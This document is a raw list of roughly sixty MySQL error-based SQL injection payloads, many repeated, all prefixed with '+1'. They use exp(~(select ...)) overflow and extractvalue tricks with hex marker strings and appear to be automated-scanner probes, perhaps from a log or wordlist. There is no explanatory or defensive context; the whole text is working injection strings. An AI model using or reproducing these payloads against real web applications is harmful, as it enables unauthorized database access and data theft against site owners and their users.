+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
